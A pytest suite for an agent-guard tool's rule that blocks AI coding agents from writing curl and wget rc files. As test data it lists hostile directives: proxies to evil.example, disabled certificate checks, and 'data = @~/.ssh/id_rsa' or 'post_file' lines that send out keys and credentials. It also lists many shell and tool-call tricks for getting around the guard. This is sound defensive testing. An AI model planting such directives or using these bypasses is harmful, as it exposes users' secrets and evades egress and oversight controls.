"""HTTP-client config hijack guard: curl's `.curlrc` / wget's `.wgetrc`.

Both tools apply every rc-file line silently to every future invocation, so a
planted `proxy`/`insecure`/`trace`/`data = @file`/`url` (wget: `https_proxy`,
`check_certificate = off`, `post_file`, `use_askpass`) MITMs, logs or
exfiltrates every later request the agent (or a human, or CI) makes -- and
routes around the egress allowlist, which only sees the host in the command.
The content check is an allowlist: routine transfer options stay allowed.
"""
import pytest

from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.policy import Action, Policy
from aegis import patterns

EMPTY = Policy()
DENY = Policy(http_client_config={"mode": "deny"})
RULE = "http-client-config-protect"


def _write(path, content):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Write",
                      args={"file_path": path, "content": content})


def _edit(path, new_string, old_string="x"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
                      args={"file_path": path, "old_string": old_string,
                            "new_string": new_string})


def _multiedit(path, new_strings):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="MultiEdit",
                      args={"file_path": path,
                            "edits": [{"old_string": "x", "new_string": n} for n in new_strings]})


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _mcp_write(args, tool="mcp__filesystem__write_file"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, action=ActionClass.MCP, args=args)


def _gated(d):
    return d.action != Action.ALLOW


def _ours(d):
    return d.action == Action.ASK and d.rule == RULE


def _ours_or_containment(d):
    """A body naming a credential-store path is already denied (stronger,
    non-escapable) by containment, which runs first."""
    return _ours(d) or (d.blocked and d.rule == "containment-credentials")


@pytest.fixture(autouse=True)
def _clean_env(monkeypatch):
    for k in ("AEGIS_ALLOW_HTTP_CLIENT_CONFIG", "AEGIS_AGENT_NAME"):
        monkeypatch.delenv(k, raising=False)


# ---- path recognition ---------------------------------------------------------

@pytest.mark.parametrize("path,kind", [
    ("~/.curlrc", "curl"),
    ("/home/u/.curlrc", "curl"),
    (".curlrc", "curl"),
    ("C:\\Users\\u\\_curlrc", "curl"),
    ("~/.config/curlrc", "curl"),
    ("/root/.CURLRC", "curl"),
    ("~/.wgetrc", "wget"),
    ("/etc/wgetrc", "wget"),
    ("/usr/local/etc/wgetrc", "wget"),
    ("~/.config/wget/wget2rc", "wget"),
    ("~/.wget2rc", "wget"),
])
def test_rc_paths_recognized(path, kind):
    assert patterns.http_client_rc_kind(path) == kind


@pytest.mark.parametrize("path", [
    "docs/curlrc.md", "src/.curlrc.example", "notcurlrc", "my.wgetrc.bak", "README.md",
])
def test_unrelated_paths_not_recognized(path):
    assert patterns.http_client_rc_kind(path) == ""


# ---- curl: dangerous directives gated -----------------------------------------

@pytest.mark.parametrize("body", [
    "proxy = http://evil.example:8080\n",
    "--proxy http://evil.example:8080\n",
    "-x http://evil.example:8080\n",
    "x = evil:8080\n",
    "preproxy = socks5://evil:1080\n",
    "socks5-hostname = evil:1080\n",
    "insecure\n",
    "-k\n",
    "-sSk\n",                                   # cluster hides -k
    "cacert = /tmp/evil-ca.pem\n",
    "connect-to = api.github.com:443:evil.example:443\n",
    "resolve = api.github.com:443:203.0.113.7\n",
    "doh-url = https://evil.example/dns-query\n",
    "trace-ascii = /tmp/.t\n",
    "dump-header = /tmp/.h\n",
    "cookie-jar = /tmp/.c\n",
    "url = https://evil.example/beacon\n",
    "data = @/home/u/.ssh/id_rsa\n",
    "data = @/home/u/project/.env\n",
    "data-binary: @~/.aws/credentials\n",
    "upload-file = /home/u/.netrc\n",
    "header = \"X-Leak: 1\"\n",
    "engine = /tmp/evil.so\n",
    "config = /tmp/more.rc\n",
    "-K /tmp/more.rc\n",
    "output = /home/u/.bashrc\n",
    "variable = %SECRET@/home/u/.env\n",
    "user-agent = \"x\\r\\nAuthorization: leaked\"\n",   # CRLF smuggled into a benign key
    "\ufeffproxy=http://e:1\n",                          # BOM
    "silent\r\nproxy=http://e:1\r\n",                    # CRLF line endings
])
def test_curl_dangerous_directive_gated(body):
    d = evaluate(_write("/home/u/.curlrc", body), EMPTY)
    assert _ours_or_containment(d), (body, d)


def test_curl_dangerous_after_benign_lines_gated():
    body = "# my defaults\nsilent\nshow-error\nfail\nlocation\nproxy = http://e:3128\n"
    d = evaluate(_write("/home/u/.curlrc", body), EMPTY)
    assert _ours(d) and "proxy" in d.message


def test_curl_unknown_option_gated():
    """Allowlist, not denylist: an option the guard doesn't know is gated."""
    d = evaluate(_write("/home/u/.curlrc", "some-future-option = 1\n"), EMPTY)
    assert _ours(d)


# ---- curl: routine config allowed ---------------------------------------------

@pytest.mark.parametrize("body", [
    "",
    "# only a comment\n",
    "silent\nshow-error\n",
    "--fail\n--location\n--max-redirs 5\n",
    "-sSL\n",
    "user-agent = \"my-tool/1.0\"\n",
    "connect-timeout = 10\nmax-time: 120\nretry 3\nretry-delay 2\n",
    "no-progress-meter\n",
    "compressed\nhttp2\nipv4\n",
    "-#\n",
    "   \n\t\n",
])
def test_curl_benign_config_allowed(body):
    d = evaluate(_write("/home/u/.curlrc", body), EMPTY)
    assert not _gated(d), (body, d)


# ---- wget ------------------------------------------------------------------------

@pytest.mark.parametrize("body", [
    "https_proxy = http://evil.example:8080\nuse_proxy = on\n",
    "http-proxy = http://evil:1\n",
    "HTTPS_PROXY=http://evil:1\n",
    "check_certificate = off\n",
    "Check-Certificate = 0\n",
    "checkcertificate=no\n",
    "hsts = off\n",
    "ca_certificate = /tmp/evil.pem\n",
    "post_file = /home/u/.ssh/id_rsa\n",
    "body_file = /home/u/.aws/credentials\n",
    "header = Authorization: x\n",
    "logfile = /tmp/.w\n",
    "save_cookies = /tmp/.c\n",
    "output_document = /home/u/.bashrc\n",
    "use_askpass = /tmp/pwn.sh\n",
    "--proxy=on\n",
])
def test_wget_dangerous_directive_gated(body):
    d = evaluate(_write("/home/u/.wgetrc", body), EMPTY)
    assert _ours_or_containment(d), (body, d)


@pytest.mark.parametrize("body", [
    "tries = 3\ntimeout = 30\n",
    "# comment\nretry_connrefused = on\nwaitretry=5\n",
    "check_certificate = on\n",
    "user_agent = my-tool/1.0\ncontinue = on\ntimestamping = on\n",
    "progress = dot:mega\nquiet = off\nrobots = off\n",
])
def test_wget_benign_config_allowed(body):
    d = evaluate(_write("/home/u/.wgetrc", body), EMPTY)
    assert not _gated(d), (body, d)


def test_wget_grammar_applied_to_wgetrc_not_curl_grammar():
    """`insecure` is not a wget command (wget would reject it) but must not be
    silently treated as benign either -- unknown names are gated."""
    d = evaluate(_write("/etc/wgetrc", "insecure\n"), EMPTY)
    assert _ours(d)


# ---- Edit / MultiEdit / MCP shapes ------------------------------------------------

def test_edit_new_string_gated():
    d = evaluate(_edit("/home/u/.curlrc", "silent\nproxy = http://e:1\n"), EMPTY)
    assert _ours(d)


def test_edit_benign_new_string_allowed(tmp_path):
    rc = tmp_path / ".curlrc"
    rc.write_text("proxy = http://e:1\n")
    d = evaluate(_edit(str(rc), "silent\n", old_string="proxy = http://e:1\n"), EMPTY)
    assert not _gated(d)


def test_multiedit_gated():
    d = evaluate(_multiedit("/home/u/.curlrc", ["silent\n", "insecure\n"]), EMPTY)
    assert _ours(d)


def test_multiedit_benign_allowed(tmp_path):
    """The file path and old_string values must not be parsed as directives."""
    rc = tmp_path / ".curlrc"
    rc.write_text("x\n")
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="MultiEdit",
                    args={"file_path": str(rc),
                          "edits": [{"old_string": "x", "new_string": "silent\nfail"}]})
    assert not _gated(evaluate(ev, EMPTY))


def test_mcp_write_gated():
    d = evaluate(_mcp_write({"path": "/home/u/.curlrc",
                             "content": "proxy=http://e:1\n"}), EMPTY)
    assert _ours(d)


def test_mcp_edit_file_newtext_gated():
    d = evaluate(_mcp_write({"path": "/home/u/.wgetrc",
                             "edits": [{"oldText": "tries=3", "newText": "https_proxy=http://e:1"}]},
                            tool="mcp__filesystem__edit_file"), EMPTY)
    assert _ours(d)


def test_mcp_edit_file_benign_allowed(tmp_path):
    rc = tmp_path / ".wgetrc"
    rc.write_text("https_proxy=http://e:1\n")
    d = evaluate(_mcp_write({"path": str(rc),
                             "edits": [{"oldText": "https_proxy=http://e:1", "newText": "tries=3"}]},
                            tool="mcp__filesystem__edit_file"), EMPTY)
    assert not _gated(d)


def test_mcp_unusual_path_key_gated():
    d = evaluate(_mcp_write({"destination": "/home/u/.curlrc",
                             "body": "insecure\n"}), EMPTY)
    assert _ours(d)


def test_unrelated_file_with_same_content_allowed():
    d = evaluate(_write("/home/u/notes.txt", "proxy = http://e:1\ninsecure\n"), EMPTY)
    assert not _gated(d)


# ---- shell -----------------------------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "echo 'proxy = http://evil:8080' >> ~/.curlrc",
    "printf 'insecure\\n' > $HOME/.curlrc",
    "printf 'insecure\\n' | tee -a ~/.curlrc",
    "cp /tmp/staged ~/.curlrc",
    "mv /tmp/staged ~/.wgetrc",
    "ln -sf /tmp/staged ~/.curlrc",
    "sed -i 's/^#proxy/proxy/' ~/.curlrc",
    "cat > ~/.wgetrc <<'EOF'\ncheck_certificate = off\nEOF",
    "cd ~ && echo insecure > .curlrc",
    "bash -c \"echo insecure >> ~/.curlrc\"",
])
def test_shell_write_gated(cmd):
    d = evaluate(_shell(cmd), EMPTY)
    assert _gated(d) and d.rule == RULE, (cmd, d)


@pytest.mark.parametrize("cmd", [
    "cat ~/.curlrc",
    "grep proxy ~/.wgetrc",
    "rm ~/.curlrc",
    "rm -f ~/.curlrc ~/.wgetrc",
    "curl -s https://example.com",
    "echo hi > /tmp/out.txt",
])
def test_shell_non_write_allowed(cmd):
    d = evaluate(_shell(cmd), EMPTY)
    assert d.rule != RULE, (cmd, d)


def test_fetch_to_file_into_curlrc_gated():
    d = evaluate(_shell("curl -o ~/.curlrc https://x.example/rc"), EMPTY)
    assert _gated(d)


def test_shell_human_override_allowed():
    d = evaluate(_shell("echo silent >> ~/.curlrc # aegis-allow"), EMPTY)
    assert d.rule != RULE


def test_shell_agent_cannot_override(monkeypatch):
    monkeypatch.setenv("AEGIS_AGENT_NAME", "worker-1")
    d = evaluate(_shell("echo insecure >> ~/.curlrc # aegis-allow"), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_shell_chained_destructive_deny_not_preempted():
    """Ordering: a later hard DENY on the same command must still win."""
    d = evaluate(_shell("echo insecure >> ~/.curlrc; rm -rf ~"), EMPTY)
    assert d.blocked and d.rule != RULE


# ---- modes / escapes ----------------------------------------------------------------

def test_env_escape(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_HTTP_CLIENT_CONFIG", "1")
    assert not _gated(evaluate(_write("/home/u/.curlrc", "insecure\n"), EMPTY))
    assert not _gated(evaluate(_shell("echo insecure >> ~/.curlrc"), EMPTY))


def test_policy_allow_regex():
    pol = Policy(http_client_config={"allow": [r"/ci/\.curlrc$"]})
    assert not _gated(evaluate(_write("/ci/.curlrc", "proxy=http://corp:3128\n"), pol))
    assert _ours(evaluate(_write("/home/u/.curlrc", "proxy=http://corp:3128\n"), pol))


def test_deny_mode():
    d = evaluate(_write("/home/u/.curlrc", "insecure\n"), DENY)
    assert d.blocked and d.rule == RULE


def test_off_mode():
    pol = Policy(http_client_config={"mode": "off"})
    assert not _gated(evaluate(_write("/home/u/.curlrc", "insecure\n"), pol))


def test_monitor_mode_allows():
    pol = Policy(http_client_config={"mode": "monitor"})
    assert not _gated(evaluate(_write("/home/u/.curlrc", "insecure\n"), pol))


def test_yaml_policy_loads(tmp_path):
    from aegis.loader import load_policy
    (tmp_path / "p.yaml").write_text("http_client_config:\n  mode: deny\n")
    pol = load_policy(str(tmp_path))
    assert pol.http_client_config.get("mode") == "deny"
    d = evaluate(_write("/home/u/.curlrc", "insecure\n"), pol)
    assert d.blocked and d.rule == RULE


# ---- performance -------------------------------------------------------------------

def test_large_benign_file_fast():
    import time
    body = "silent\n" * 200000
    t = time.time()
    evaluate(_write("/home/u/.curlrc", body), EMPTY)
    assert time.time() - t < 2.0


# ---- QA round 1 regressions ---------------------------------------------------------

@pytest.mark.parametrize("cmd", [
    # path glued to `<`/`>` (heredoc / redirect)
    "cat >~/.curlrc<<EOF\ninsecure\nEOF",
    "cat >~/.wgetrc<<'EOF'\nhttps_proxy=http://e\ncheck_certificate=off\nEOF",
    "tee ~/.curlrc</tmp/evil",
    "tee ~/.curlrc>/dev/null <<< insecure",
    "printf 'proxy=x' | tee -a ~/.curlrc>/dev/null",
    # bare relative redirect target
    "cd ~ && echo insecure >.curlrc",
    "cd ~ && echo insecure >>.curlrc",
    # escapes / braces / globs
    "printf 'insecure\\n' > ~/.curl\\rc",
    "echo insecure | tee ~/.{curl,wget}rc",
    "echo insecure | tee ~/.curl{rc,}",
    "echo insecure >> ~/.curlr?",
    "echo insecure >> ~/.curlr[c]",
    "echo insecure >> ~/.wget*",
    # write tools outside any verb list
    "rsync /tmp/evil ~/.curlrc",
    "tar -xf /tmp/x.tar -C ~ .curlrc",
    "unzip -o /tmp/x.zip .curlrc -d ~",
    "echo insecure | sponge ~/.curlrc",
    "socat -u FILE:/tmp/e CREATE:$HOME/.curlrc",
    "sed -n 'w /home/u/.curlrc' /tmp/evil",
    "vim -es -c 'normal iinsecure' -c 'x' ~/.curlrc",
    "ex -s ~/.curlrc <<< $'a\\ninsecure\\n.\\nx'",
    "patch ~/.curlrc < /tmp/p.diff",
    "cpio -i < x.cpio .curlrc",
    "echo 'use_askpass=/tmp/x' > /etc/wget2rc",
])
def test_qa1_shell_bypasses_gated(cmd):
    d = evaluate(_shell(cmd), EMPTY)
    assert _gated(d), (cmd, d)


@pytest.mark.parametrize("cmd", [
    "cat ~/.curlrc 2>/dev/null",
    "ls -la ~/.curlrc ~/.wgetrc",
    "test -f ~/.curlrc && cat ~/.curlrc | grep -v proxy",
    "rm -f ~/.curlrc",
    "head -n 5 ~/.wgetrc; wc -l ~/.wgetrc",
])
def test_qa1_shell_reads_still_allowed(cmd):
    d = evaluate(_shell(cmd), EMPTY)
    assert d.rule != RULE, (cmd, d)


def test_qa1_ntfs_stream_path_gated():
    d = evaluate(_write("C:\\Users\\u\\.curlrc::$DATA", "insecure\n"), EMPTY)
    assert _ours(d)
    d = evaluate(_write("C:\\Users\\u\\.curlrc:x", "insecure\n"), EMPTY)
    assert _ours(d)


@pytest.mark.parametrize("before,old,new", [
    ("# insecure\n", "# ", ""),
    ("silent insecure\n", "silent ", "\n"),
    ("#insecure\n", "#", "  "),
    ("# proxy = http://e:1\nsilent\n", "# proxy", "proxy"),
])
def test_qa1_deletion_edit_uncovering_directive_gated(tmp_path, before, old, new):
    rc = tmp_path / ".curlrc"
    rc.write_text(before)
    d = evaluate(_edit(str(rc), new, old_string=old), EMPTY)
    assert _ours(d), d
    d = evaluate(_multiedit(str(rc), []), EMPTY)   # sanity: empty edit list
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="MultiEdit",
                    args={"file_path": str(rc),
                          "edits": [{"old_string": old, "new_string": new}]})
    assert _ours(evaluate(ev, EMPTY))


def test_qa1_mcp_deletion_edit_gated(tmp_path):
    rc = tmp_path / ".wgetrc"
    rc.write_text("# https_proxy = http://e\n")
    d = evaluate(_mcp_write({"path": str(rc),
                             "edits": [{"oldText": "# ", "newText": ""}]},
                            tool="mcp__filesystem__edit_file"), EMPTY)
    assert _ours(d)


def test_qa1_edit_of_unrelated_line_keeps_existing_directive_allowed(tmp_path):
    """A pre-existing proxy line the human set is not re-litigated by an
    unrelated benign edit."""
    rc = tmp_path / ".curlrc"
    rc.write_text("proxy = http://corp:3128\nretry 2\n")
    d = evaluate(_edit(str(rc), "retry 5", old_string="retry 2"), EMPTY)
    assert not _gated(d), d


def test_qa1_edit_changing_proxy_value_gated(tmp_path):
    rc = tmp_path / ".curlrc"
    rc.write_text("proxy = http://corp:3128\n")
    d = evaluate(_edit(str(rc), "http://evil:3128", old_string="http://corp:3128"), EMPTY)
    assert _ours(d)


def test_qa1_unverifiable_deleting_edit_gated(tmp_path):
    d = evaluate(_edit(str(tmp_path / "missing" / ".curlrc"), "", old_string="# "), EMPTY)
    assert _ours(d)


# ---- QA round 1 (design review) --------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "echo 'proxy=x'|tee ~/.curlrc>/dev/null",
    "cp /tmp/x ~/.curlrc>/dev/null",
    "ln -sf /tmp/x ~/.curlrc>/dev/null",
    "tee ~/.wgetrc</tmp/payload",
    "echo proxy=x > \"$XDG_CONFIG_HOME/curlrc\"",
    "echo proxy=x > ${XDG_CONFIG_HOME}/curlrc",
])
def test_design_qa1_shell_gated(cmd):
    assert _gated(evaluate(_shell(cmd), EMPTY)), cmd


@pytest.mark.parametrize("cmd", [
    "ls -la ~/.curlrc 2>/dev/null",
    "cat ~/.wgetrc 2>/dev/null || true",
    "stat ~/.curlrc >/dev/null 2>&1",
    "test -f ~/.curlrc && echo yes 2>&1",
])
def test_design_qa1_fd_noise_reads_allowed(cmd):
    assert evaluate(_shell(cmd), EMPTY).rule != RULE, cmd


@pytest.mark.parametrize("tool,args", [
    ("mcp__fs__read_file", {"path": "~/.curlrc", "encoding": "utf-8"}),
    ("mcp__fs__read_text_file", {"path": "~/.curlrc", "mode": "text"}),
    ("mcp__fs__get_file_info", {"path": "~/.curlrc", "format": "json"}),
    ("mcp__fs__search_files", {"path": "~/.wgetrc", "pattern": "proxy"}),
])
def test_design_qa1_mcp_reads_allowed(tool, args):
    assert not _gated(evaluate(_mcp_write(args, tool=tool), EMPTY))


@pytest.mark.parametrize("body", [
    'write-out = "\\n"\n', '-w "\\n%{http_code}\\n"\n', "create-dirs\n",
    "netrc-optional\n", "proto = =https\n", "proto-default https\n",
    "max-filesize 10M\n", "noproxy = localhost\n", "ca-native\n",
])
def test_design_qa1_curl_common_options_allowed(body):
    assert not _gated(evaluate(_write("/home/u/.curlrc", body), EMPTY)), body


@pytest.mark.parametrize("body", [
    'write-out = "%output{>>/home/u/.bashrc}x"\n', "verbose\n", "-v\n",
    "include\n", "-i\n",
])
def test_design_qa1_curl_logging_options_gated(body):
    assert _ours(evaluate(_write("/home/u/.curlrc", body), EMPTY)), body


@pytest.mark.parametrize("body,gated", [
    ("use_proxy = off\n", False), ("use_proxy = on\n", True),
    ("no_proxy = localhost\n", False), ("passive_ftp = on\n", False),
    ("secure_protocol = TLSv1_2\n", False), ("secure_protocol = SSLv3\n", True),
    ("debug = on\n", True), ("server_response = on\n", True),
])
def test_design_qa1_wget_options(body, gated):
    d = evaluate(_write("/home/u/.wgetrc", body), EMPTY)
    assert _gated(d) == gated, body


def test_design_qa1_kind_from_matched_name_only():
    assert patterns.http_client_rc_kind("/home/u/wgetrc-dir/.curlrc") == "curl"


@pytest.mark.parametrize("bad", [None, 5, [], {}, b"proxy=x"])
def test_design_qa1_helpers_accept_odd_input(bad):
    assert patterns.http_client_rc_kind(bad) == ""
    assert patterns.http_client_rc_unsafe_directives(bad, "curl") == []
    assert patterns.http_client_rc_shell_path_hit(bad) is False


def test_design_qa1_allow_string_is_one_regex():
    pol = Policy(http_client_config={"allow": "corp/\\.curlrc$"})
    assert _ours(evaluate(_write("/home/u/.curlrc", "insecure\n"), pol))
    assert not _gated(evaluate(_write("/corp/.curlrc", "insecure\n"), pol))
    pol = Policy(http_client_config={"allow": 5})
    assert _ours(evaluate(_write("/home/u/.curlrc", "insecure\n"), pol))


def test_registered_in_core_rules_tail_and_fetch_backstop():
    from aegis import rules
    core = list(rules._CORE_RULES)
    i = core.index(rules.rule_http_client_config_protect)
    assert i > core.index(rules.rule_destructive_delete)
    assert i > core.index(rules.rule_remote_exec)
    assert any(rx is patterns.HTTP_CLIENT_RC_PATH_RE for rx, _ in rules._FETCH_HUMAN_ESCAPABLE)


def test_monitor_mode_records(monkeypatch):
    from aegis import rules
    seen = []
    monkeypatch.setattr(rules, "_record_monitor", lambda ev, d, note="": seen.append((d.rule, note)))
    pol = Policy(http_client_config={"mode": "monitor"})
    assert not _gated(evaluate(_write("/home/u/.curlrc", "insecure\n"), pol))
    assert seen and seen[0][0] == RULE


def test_yaml_allow_loads(tmp_path):
    from aegis.loader import load_policy
    (tmp_path / "p.yaml").write_text("http_client_config:\n  allow: ['/ci/\\.curlrc$']\n")
    pol = load_policy(str(tmp_path))
    assert not _gated(evaluate(_write("/ci/.curlrc", "proxy=http://c:1\n"), pol))


# ---- QA round 2 regressions ---------------------------------------------------------

def test_qa2_long_command_padding_still_gated():
    d = evaluate(_shell("echo " + "a" * 30000 + "; cp x ~/.curlrc"), EMPTY)
    assert _gated(d)


@pytest.mark.parametrize("args,tool", [
    ({"edits": [{"search": "# ", "replace": ""}]}, "mcp__fs__edit_file"),
    ({"old_text": "# ", "new_text": ""}, "mcp__fs__edit_file"),
    ({"oldText": "# ", "newText": ""}, "mcp__fs__replace_text"),
    ({"old_str": "# ", "new_str": ""}, "mcp__fs__str_replace"),
    ({"edits": {"oldText": "# ", "newText": ""}}, "mcp__fs__edit_file"),
    ({"edits": [{"before_text": "# ", "after_text": ""}]}, "mcp__fs__edit_file"),
])
def test_qa2_mcp_edit_shapes_replayed_or_gated(tmp_path, args, tool):
    rc = tmp_path / ".curlrc"
    rc.write_text("# proxy = http://p.invalid\n")
    d = evaluate(_mcp_write(dict(args, path=str(rc)), tool=tool), EMPTY)
    assert _ours(d), (args, d)


@pytest.mark.parametrize("tool,args", [
    ("mcp__fs__add_file", {"path": "/home/u/.curlrc", "file_content": "proxy = http://p.invalid"}),
    ("mcp__fs__store", {"target": "/home/u/.curlrc", "input": "proxy = http://p.invalid"}),
    ("mcp__fs__write_file", {"path": "/home/u/.curlrc", "content": "silent",
                             "file_body": "proxy = http://p.invalid"}),
])
def test_qa2_mcp_unlisted_content_keys_gated(tool, args):
    assert _ours(evaluate(_mcp_write(args, tool=tool), EMPTY))


@pytest.mark.parametrize("cmd", [
    "cp /tmp/x ${XDG_CONFIG_HOME:-$HOME/.config}/curlrc",
    "cp /tmp/x ${XDG_CONFIG_HOME-~/.config}/curlrc",
    "cp /tmp/x ${XDG_CONFIG_HOME:=~/.config}/curlrc",
    "cp x ~/.config/*lrc",
    "cp x /etc/*getrc",
    "rg --pre /tmp/helper.sh . ~/.curlrc",
    "bat --paging=always --pager=/tmp/helper.sh ~/.curlrc",
    "cat ~/.curlrc | sort -o ~/.curlrc",
    "for f in ~/.curlrc; do cp /tmp/x $f; done",
])
def test_qa2_shell_gated(cmd):
    assert _gated(evaluate(_shell(cmd), EMPTY)), cmd


@pytest.mark.parametrize("cmd", [
    "if [ -f ~/.wgetrc ]; then cat ~/.wgetrc; fi",
    "for f in ~/.curlrc ~/.wgetrc; do cat $f; done",
    "cat ~/.curlrc | cut -c1-5",
    "cat -A ~/.curlrc | cut -c1-80",
    "nl ~/.curlrc",
])
def test_qa2_shell_reads_allowed(cmd):
    assert evaluate(_shell(cmd), EMPTY).rule != RULE, cmd


def test_qa2_remote_name_all_allowed():
    assert not _gated(evaluate(_write("/home/u/.curlrc", "remote-name-all\n"), EMPTY))


@pytest.mark.parametrize("cmd", [
    "echo '* text=auto' >> .gitattributes",
    "cp *.txt /tmp/out/",
    "echo 'see ~/.curlrc docs' | grep curl",
])
def test_qa2_bare_glob_not_an_rc_path(cmd):
    assert evaluate(_shell(cmd), EMPTY).rule != RULE, cmd


# ---- QA round 3 regressions ---------------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "set -- 1; for x do cp /tmp/staged ~/.curlrc; done",
    "set -- 1; for x do cp /tmp/staged /etc/wgetrc; done",
    "set -- 1; for x do curl -so ~/.curlrc https://evil.example/rc; done",
    "set -- 1; for x do tee -a ~/.curlrc < /tmp/staged; done",
    "set -- 1\nfor x do\ncp /tmp/staged ~/.curlrc\ndone",
    "if true; then cp /tmp/x ~/.curlrc; fi",
    "sort --out ~/.curlrc /tmp/staged",
    "sort --ou=$HOME/.curlrc /tmp/staged",
    "cat /tmp/staged | sort --out ~/.curlrc",
    "copy x %XDG_CONFIG_HOME%\\curlrc",
    "Copy-Item x $env:XDG_CONFIG_HOME\\curlrc",
])
def test_qa3_shell_gated(cmd):
    assert _gated(evaluate(_shell(cmd), EMPTY)), cmd


@pytest.mark.parametrize("tool,args", [
    ("mcp__desktop-commander__start_process", {"command": "echo insecure >> ~/.curlrc"}),
    ("mcp__desktop-commander__start_process", {"command": "cp /tmp/staged ~/.curlrc"}),
    ("mcp__shell__run_command", {"command": "printf 'proxy=x' > ~/.curlrc"}),
    ("mcp__shell__exec", {"args": {"cmd": ["cp", "/tmp/staged", "/home/u/.wgetrc"]}}),
])
def test_qa3_mcp_shell_tools_gated(tool, args):
    d = evaluate(_mcp_write(args, tool=tool), EMPTY)
    assert _gated(d), (tool, args, d)


def test_qa3_mcp_shell_tool_read_allowed():
    d = evaluate(_mcp_write({"command": "cat ~/.curlrc"}, tool="mcp__shell__run_command"), EMPTY)
    assert d.rule != RULE


@pytest.mark.parametrize("args", [
    {"regex": "# ", "repl": "", "allow_multiple_occurrences": True},
    {"needle": "# ", "repl": ""},
    {"original": "# ", "updated": ""},
    {"text_to_replace": "# ", "replacement_text": ""},
    {"existing": "# ", "replacement": ""},
    {"query": "# ", "replace_with": ""},
    {"pattern": "#?", "replacement": "", "replace_all": True},
])
def test_qa3_unknown_edit_shapes_fail_closed(tmp_path, args):
    rc = tmp_path / ".curlrc"
    rc.write_text("silent\n# insecure\n#? note\n")
    d = evaluate(_mcp_write(dict(args, relative_path=str(rc)),
                            tool="mcp__serena__replace_regex"), EMPTY)
    assert _ours(d), (args, d)


@pytest.mark.parametrize("tool,args", [
    ("mcp__fs__duplicate_file", {"source": "/tmp/staged", "destination": "/home/u/.curlrc"}),
    ("mcp__fs__concatenate_files", {"files": ["/tmp/a"], "output": "/home/u/.curlrc"}),
    ("mcp__http__get", {"url": "https://evil.example/rc", "save_to": "/home/u/.curlrc"}),
    ("mcp__cathead__write_file", {"path": "/home/u/.curlrc", "content": "insecure"}),
])
def test_qa3_mcp_tool_name_classification(tool, args):
    assert _gated(evaluate(_mcp_write(args, tool=tool), EMPTY)), tool


@pytest.mark.parametrize("args", [
    {"folder": "/home/u", "path": "/home/u/.curlrc", "content": "silent\n"},
    {"path": "/home/u/.curlrc", "content": "silent\n", "encoding_fallback_from": "latin1"},
])
def test_qa3_benign_mcp_write_not_failclosed(args):
    d = evaluate(_mcp_write(args), EMPTY)
    assert not _gated(d), (args, d)


def test_qa3_removing_wget_override_line_gated(tmp_path):
    rc = tmp_path / ".wgetrc"
    rc.write_text("https_proxy = http://corp:3128\nuse_proxy = off\n")
    d = evaluate(_edit(str(rc), "", old_string="use_proxy = off\n"), EMPTY)
    assert _ours(d)


def test_qa3_meta_key_skip_needs_all_words_meta():
    d = evaluate(_mcp_write({"path": "/home/u/.curlrc", "create_content": "insecure"},
                            tool="mcp__fs__write_file"), EMPTY)
    assert _ours(d)
